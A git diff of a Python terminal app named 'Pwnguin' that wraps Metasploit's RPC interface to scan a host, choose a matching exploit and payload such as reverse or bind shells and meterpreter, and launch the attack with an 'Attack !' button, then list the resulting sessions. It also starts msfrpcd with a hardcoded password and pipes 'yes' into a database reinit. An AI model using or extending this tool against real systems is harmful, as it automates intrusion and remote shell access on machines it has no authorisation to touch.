@@ -1,6 +1,9 @@
 import re
 import subprocess
 import json
+import time
+from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
+
 
 from textual.app import App, ComposeResult
 from textual.widgets import (
@@ -18,183 +21,57 @@ from textual.widgets import (
     DataTable,
     OptionList,
     Pretty,
+    Button,
 )
-from textual import work
-from textual.containers import Container
+from textual import work, on, log
+from textual.color import Color
+from textual.containers import Container, Horizontal
+from rich.style import Style
 from rich.text import Text
 
-STATE = {"action": None, "IP": None, "target": None, "exploit": None, "payload": None}
+STATE = {
+    "client": None,  # MsfRpcClient
+    "action": None,  # 0 for network scan, 1 for computer scan
+    "IP": None,
+    "vulnerabilities": None,
+    "vulnerability": None,  # index of the chosen vulnerability
+    "exploits": None,
+    "exploit": None,  # index of the chosen exploit
+    "exploit_ms": None,  # Metasploit exploit object
+    "payloads": None,
+    "payload": None,  # index of the chosen payload
+    "payload_ms": None,  # Metasploit payload object
+}
+
+RANK_COLORS = {
+    "excellent": "red",
+    "great": "orange",
+    "good": "yellow",
+    "normal": "green",
+    "average": "blue",
+    "low": "grey",
+    "manual": "white",
+}
 
 vulnerabilities = [
-    "vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption",
-    "vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)",
-    "vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)",
-    "vsftpd 2.3.2 - Denial of Service",
-    "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)",
-    "vsftpd 2.3.4 - Backdoor Command Execution",
-    "vsftpd 3.0.3 - Remote Denial of Service",
-    "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)",
-    "vsftpd 2.3.4 - Backdoor Command Execution",
-    "Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation",
-    "Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service",
-    "FreeBSD OpenSSH 3.5p1 - Remote Command Execution",
-    "glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read",
-    "Novell Netware 6.5 - OpenSSH Remote Stack Overflow",
-    "OpenSSH 1.2 - '.scp' File Create/Overwrite",
-    "OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)",
-    "OpenSSH 2.3 < 7.7 - Username Enumeration",
-    "OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One",
-    "OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow",
-    "OpenSSH 3.x - Challenge-Response Buffer Overflow (1)",
-    "OpenSSH 3.x - Challenge-Response Buffer Overflow (2)",
-    "OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service",
-    "OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation",
-    "OpenSSH 7.2 - Denial of Service",
-    "OpenSSH 7.2p1 - (Authenticated) xauth Command Injection",
-    "OpenSSH < 6.6 SFTP (x64) - Command Execution",
-    "OpenSSH < 6.6 SFTP - Command Execution",
-    "OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation",
-    "OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading",
-    "OpenSSH < 7.7 - User Enumeration (2)",
-    "OpenSSH SCP Client - Write Arbitrary Files",
-    "OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident",
-    "OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool",
-    "OpenSSHd 7.2p2 - Username Enumeration",
-    "Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack",
+    "Here are the vulns after being found",
 ]
 
 exploits = [
-    ["exploit path", "quality", "description"],
     [
         "exploit/osx/local/setuid_tunnelblick",
         "excellent",
-        "Setuid Tunnelblick Privilege Escalation",
+        "Here are the exploits of the vulns",
     ],
     [
         "exploit/multi/http/sflog_upload_exec",
-        "excellent",
-        "Sflog! CMS 1.0 Arbitrary File Upload Vulnerability",
-    ],
-    [
-        "exploit/windows/fileformat/shadow_stream_recorder_bof",
         "normal",
-        "Shadow Stream Recorder 3.0.1.7 Buffer Overflow",
-    ],
-    [
-        "exploit/windows/http/sharepoint_data_deserialization",
-        "excellent",
-        "SharePoint DataSet / DataTable Deserialization",
-    ],
-    [
-        "exploit/windows/http/sharepoint_workflows_xoml",
-        "excellent",
-        "SharePoint Workflows XOML Injection",
-    ],
-    [
-        "exploit/windows/misc/shixxnote_font",
-        "great",
-        "ShixxNOTE 6.net Font Field Overflow",
-    ],
-    [
-        "exploit/multi/http/shopware_createinstancefromnamedarguments_rce",
-        "excellent",
-        "Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE",
-    ],
-    [
-        "exploit/windows/scada/winlog_runtime",
-        "great",
-        "Sielco Sistemi Winlog Buffer Overflow",
-    ],
-    [
-        "exploit/windows/scada/winlog_runtime_2",
-        "normal",
-        "Sielco Sistemi Winlog Buffer Overflow 2.07.14 - 2.07.16",
-    ],
-    [
-        "exploit/windows/scada/factorylink_csservice",
-        "normal",
-        "Siemens FactoryLink 8 CSService Logging Path Param Buffer Overflow",
-    ],
-    [
-        "exploit/windows/scada/factorylink_vrn_09",
-        "average",
-        "Siemens FactoryLink vrn.exe Opcode 9 Buffer Overflow",
-    ],
-    [
-        "exploit/windows/browser/siemens_solid_edge_selistctrlx",
-        "normal",
-        "Siemens Solid Edge ST4 SEListCtrlX ActiveX Remote Code Execution",
-    ],
-    [
-        "exploit/multi/http/simple_backdoors_exec",
-        "excellent",
-        "Simple Backdoor Shell Remote Code Execution",
-    ],
-    [
-        "exploit/unix/webapp/simple_e_document_upload_exec",
-        "excellent",
-        "Simple E-Document Arbitrary File Upload",
-    ],
-    [
-        "exploit/unix/webapp/sphpblog_file_upload",
-        "excellent",
-        "Simple PHP Blog Remote Command Execution",
-    ],
-    [
-        "exploit/windows/http/sws_connection_bof",
-        "normal",
-        "Simple Web Server Connection Header Buffer Overflow",
-    ],
-    [
-        "exploit/windows/http/sitecore_xp_cve_2021_42237",
-        "excellent",
-        "Sitecore Experience Platform (XP) PreAuth Deserialization RCE",
-    ],
-    [
-        "exploit/unix/webapp/sixapart_movabletype_storable_exec",
-        "good",
-        "SixApart MovableType Storable Perl Code Execution",
-    ],
-    [
-        "exploit/unix/webapp/skybluecanvas_exec",
-        "excellent",
-        "SkyBlueCanvas CMS Remote Code Execution",
-    ],
-    [
-        "exploit/windows/ftp/slimftpd_list_concat",
-        "great",
-        "SlimFTPd LIST Concatenation Overflow",
-    ],
-    [
-        "exploit/windows/http/smartermail_rce",
-        "excellent",
-        "SmarterTools SmarterMail less than build 6985 - .NET Deserialization Remote Code Execution",
+        "Some exploits are better than others",
     ],
 ]
 
 payloads = [
-    ["payload path"],
-    ["payload/aix/ppc/shell_bind_tcp"],
-    ["payload/aix/ppc/shell_find_port"],
-    ["payload/aix/ppc/shell_reverse_tcp"],
-    ["payload/aix/ppc/shell_interact"],
-    ["payload/cmd/unix/adduser"],
-    ["payload/android/meterpreter_reverse_http"],
-    ["payload/android/meterpreter_reverse_https"],
-    ["payload/android/meterpreter_reverse_tcp"],
-    ["payload/android/meterpreter/reverse_http"],
-    ["payload/android/meterpreter/reverse_https"],
-    ["payload/android/meterpreter/reverse_tcp"],
-    ["payload/osx/armle/shell_bind_tcp"],
-    ["payload/osx/armle/shell_reverse_tcp"],
-    ["payload/apple_ios/aarch64/shell_reverse_tcp"],
-    ["payload/osx/armle/vibrate"],
-    ["payload/apple_ios/aarch64/meterpreter_reverse_http"],
-    ["payload/apple_ios/armle/meterpreter_reverse_http"],
-    ["payload/apple_ios/aarch64/meterpreter_reverse_https"],
-    ["payload/apple_ios/armle/meterpreter_reverse_https"],
-    ["payload/apple_ios/aarch64/meterpreter_reverse_tcp"],
-    ["payload/apple_ios/armle/meterpreter_reverse_tcp"],
+    "And finally the payloads of the choosen exploit",
 ]
 
 networks = {
@@ -220,30 +97,31 @@ class Tile1(Static):
     def on_mount(self) -> None:
         self.border_title = "Action Type"
 
-    def on_option_list_option_highlighted(
-        self, event: OptionList.OptionSelected
-    ) -> None:
-        input = self.parent.query_one(Input)
+    @on(OptionList.OptionHighlighted)
+    def show_selected(self, event: OptionList.OptionHighlighted) -> None:
+        input = self.parent.query_one("#command", Input)
         if event.option_index == 0:
             input.placeholder = "Enter network with mask (default: 192.168.0.0/24)"
         elif event.option_index == 1:
             input.placeholder = "Enter computer IP (default: 127.0.0.1)"
         STATE["action"] = event.option_index
 
-    def on_option_list_option_selected(self, event: OptionList.OptionSelected) -> None:
-        input = self.parent.query_one(Input)
+    @on(OptionList.OptionSelected)
+    def give_focus(self, event: OptionList.OptionSelected) -> None:
+        input = self.parent.query_one("#command", Input)
         input.focus()
 
 
 class Tile2(Static):
 
     def compose(self) -> ComposeResult:
-        yield Input(placeholder="command here")
+        yield Input(placeholder="command here", id="command")
 
     def on_mount(self) -> None:
         self.border_title = "Input"
 
-    def on_input_submitted(self, text: str) -> None:
+    @on(Input.Submitted)
+    def scan(self, text: str) -> None:
         input = self.query_one(Input)
         command = input.value
         input.value = ""
@@ -263,13 +141,13 @@ class Tile2(Static):
             if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$").match(command):
                 input.placeholder = "Wrong format (default: 127.0.0.1)"
                 return
-            input.placeholder = "Computer scan not implemented yet"
+            input.placeholder = "scan started"
             STATE["IP"] = command
             self.perform_scan(STATE["IP"])
 
     @work(exclusive=True, thread=True)
     def perform_scan(self, IP: str) -> None:
-        pretty = self.parent.query_one(Pretty)
+        pretty = self.parent.query_one("#logs", Pretty)
         self.app.call_from_thread(pretty.update, "Scanning " + IP)
         perform_scan(IP)
         EXPLOIT_LIST = "./exploit_list"
@@ -277,11 +155,25 @@ class Tile2(Static):
             result = json.loads(f.read())
         self.app.call_from_thread(pretty.update, result)
 
+        # Create exploits from the list of research
+        exploits = []
+        for search in result:
+            exploits += search["RESULTS_EXPLOIT"]
+        titles = [pwn["Title"] for pwn in exploits]
+
+        STATE["vulnerabilities"] = titles
+        vuln_list = self.parent.query_one("#vuln_list", OptionList)
+        self.app.call_from_thread(vuln_list.clear_options)
+        self.app.call_from_thread(vuln_list.add_options, titles)
+        tab = self.app.query_one(Tile5)
+        self.app.call_from_thread(tab.set_active_tab, "vuln_tab")
+        self.app.call_from_thread(vuln_list.focus)
+
 
 class Tile3(Static):
 
     def compose(self) -> ComposeResult:
-        yield Pretty("Nothing for now")
+        yield Pretty("Nothing for now", id="logs")
         # yield LoadingIndicator()
 
     def on_mount(self) -> None:
@@ -304,54 +196,151 @@ class Tile4(Static):
 
 class VulnChoice(Static):
     def compose(self) -> ComposeResult:
-        with ListView():
-            for vuln in vulnerabilities:
-                yield ListItem(Label(vuln))
+        with Container():
+            yield OptionList(*vulnerabilities, id="vuln_list")
+
+    @on(OptionList.OptionSelected)
+    def select_vuln(self, event: OptionList.OptionSelected) -> None:
+        STATE["vulnerability"] = event.option_index
+        client: MsfRpcClient = STATE["client"]
+        modules = client.modules.search(
+            STATE["vulnerabilities"][event.option_index][:-12]
+        )
+        STATE["exploits"] = modules
+        exploitsList = self.app.query_one("#exploit_list", OptionList)
+        exploitsList = exploitsList.clear_options()
+        exploits = [
+            Text(exploit["fullname"], style=RANK_COLORS[exploit["rank"]])
+            for exploit in modules
+        ]
+        exploitsList.add_options(exploits)
+        self.app.query_one(TabbedContent).active = "exploit_tab"
+        exploitsList.focus()
 
 
 class ExploitMenu(Static):
     def compose(self) -> ComposeResult:
-        yield DataTable()
+        options = [
+            Text(exploit[2], Style(color=Color.parse(RANK_COLORS[exploit[1]]).hex))
+            for exploit in exploits
+        ]
+        with Container():
+            with Horizontal(classes="horizontal"):
+                yield Label("Rankings:")
+                for rank, color in RANK_COLORS.items():
+                    yield Label(rank, classes=color)
+            yield OptionList(*options, id="exploit_list")
 
-    def on_mount(self) -> None:
-        table = self.query_one(DataTable)
-        table.add_columns(*exploits[0])
-        for row in exploits[1:]:
-            # Adding styled and justified `Text` objects instead of plain strings.
-            styled_row = [
-                Text(str(cell), style="italic #03AC13", justify="left") for cell in row
-            ]
-            table.add_row(*styled_row)
+    @on(OptionList.OptionSelected)
+    def select_exploit(self, event: OptionList.OptionSelected) -> None:
+        STATE["exploit"] = event.option_index
+        exploit = STATE["exploits"][event.option_index]
+        client: MsfRpcClient = STATE["client"]
+        exploit_ms = client.modules.use(exploit["type"], exploit["fullname"])
+        STATE["exploit_ms"] = exploit_ms
+        payloads = exploit_ms.targetpayloads()
+        STATE["payloads"] = payloads
+        payloadsList = self.app.query_one("#payload_list", OptionList)
+        payloadsList.clear_options()
+        payloadsList.add_options([Text(payload) for payload in payloads])
+        self.app.query_one(TabbedContent).active = "payload_tab"
+        payloadsList.focus()
 
 
 class PayloadMenu(Static):
     def compose(self) -> ComposeResult:
-        yield DataTable()
+        with Container():
+            yield OptionList(*payloads, id="payload_list")
 
-    def on_mount(self) -> None:
-        table = self.query_one(DataTable)
-        table.add_columns(*payloads[0])
-        for row in payloads[1:]:
-            # Adding styled and justified `Text` objects instead of plain strings.
-            styled_row = [
-                Text(str(cell), style="italic #03AC13", justify="left") for cell in row
-            ]
-            table.add_row(*styled_row)
+    @on(OptionList.OptionSelected)
+    def select_payload(self, event: OptionList.OptionSelected) -> None:
+        STATE["payload"] = event.option_index
+        payload = STATE["payloads"][event.option_index]
+        client: MsfRpcClient = STATE["client"]
+        payload_ms = client.modules.use("payload", payload)
+        STATE["payload_ms"] = payload_ms
+        self.app.query_one(ParamMenu).create()
+        self.app.query_one(TabbedContent).active = "param_tab"
+
+
+class ParamMenu(Static):
+    def compose(self) -> ComposeResult:
+        with Container(id="params_container"):
+            yield ListView(
+                ListItem(Container(Label("Param 1"), Input(placeholder="value 1"))),
+                ListItem(Container(Label("Param 2"), Input(placeholder="value 2"))),
+                id="params_list",
+            )
+            yield Button.success("Attack !")
+
+    @on(ListView.Selected)
+    def select(self, event: ListView.Selected) -> None:
+        event.item.query_one(Input).focus()
+
+    @on(Input.Submitted)
+    def submit(self, event: Input.Submitted) -> None:
+        self.query_one(ListView).focus()
+
+    @on(Button.Pressed)
+    def pre_launch_attack(self, event: Button.Pressed) -> None:
+        for list_item in self.query_one(ListView).children:
+            param_name = str(list_item.query_one(Label).renderable)
+            param_value = list_item.query_one(Input).value
+            if param_name in STATE["exploit_ms"].missing_required:
+                STATE["exploit_ms"][param_name] = param_value
+            else:
+                STATE["payload_ms"][param_name] = param_value
+        self.app.query_one("#logs", Pretty).update("Okayy let's goo !")
+        self.launch_attack()
+
+    @work(exclusive=True, thread=True)
+    def launch_attack(self):
+        client: MsfRpcClient = STATE["client"]
+        exploit = STATE["exploit_ms"]
+        payload = STATE["payload_ms"]
+        exploit.execute(payload=payload)
+        time.sleep(20)
+        self.app.call_from_thread(
+            self.app.query_one("#logs", Pretty).update, client.sessions.list
+        )
+
+    def param_item_widget(self, name: str, placeholder) -> ListItem:
+        return ListItem(Container(Label(name), Input(placeholder=placeholder)))
+
+    def create(self):
+        params_list = self.query_one("#params_list", ListView)
+        params_list.clear()
+        exploit: ExploitModule = STATE["exploit_ms"]
+        payload: PayloadModule = STATE["payload_ms"]
+        for param in exploit.missing_required:
+            params_list.append(
+                self.param_item_widget(param, exploit.info["options"][param]["desc"])
+            )
+        for param in payload.missing_required:
+            params_list.append(
+                self.param_item_widget(param, payload.info["options"][param]["desc"])
+            )
+        params_list.focus()
 
 
 class Tile5(Static):
 
     def compose(self) -> ComposeResult:
         with TabbedContent():
-            with TabPane("Vulnerabilities"):
+            with TabPane("Vulnerabilities", id="vuln_tab"):
                 yield VulnChoice()
-            with TabPane("Exploit Menu"):
+            with TabPane("Exploit Menu", id="exploit_tab"):
                 yield ExploitMenu()
-            with TabPane("Payload Menu"):
+            with TabPane("Payload Menu", id="payload_tab"):
                 yield PayloadMenu()
+            with TabPane("Parameters", id="param_tab"):
+                yield ParamMenu("Exploit")
 
     def on_mount(self) -> None:
         self.border_title = "Exploitation"
+
+    def set_active_tab(self, active: str) -> None:
+        self.query_one(TabbedContent).active = active
 
 
 class Pwnguin(App):
@@ -369,6 +358,28 @@ class Pwnguin(App):
             yield Tile4(classes="tile", id="tile4")
             yield Tile5(classes="tile", id="tile5")
         yield Footer()
+
+    def on_mount(self) -> None:
+        self.sub_title = "starting msfconsole..."
+        self.init_app()
+
+    @work(exclusive=True, thread=True)
+    def init_app(self):
+        proc = subprocess.run(
+            "msfrpcd -P yourpassword", shell=True, stderr=subprocess.DEVNULL
+        )
+        time.sleep(5)
+        proc = subprocess.run(
+            "echo 'yes' | msfdb reinit",
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )  # if db problem
+        STATE["client"] = MsfRpcClient("yourpassword", ssl=True)
+        self.app.call_from_thread(self.end_init)
+
+    def end_init(self):
+        self.sub_title = "ready for pwn"
 
 
 if __name__ == "__main__":
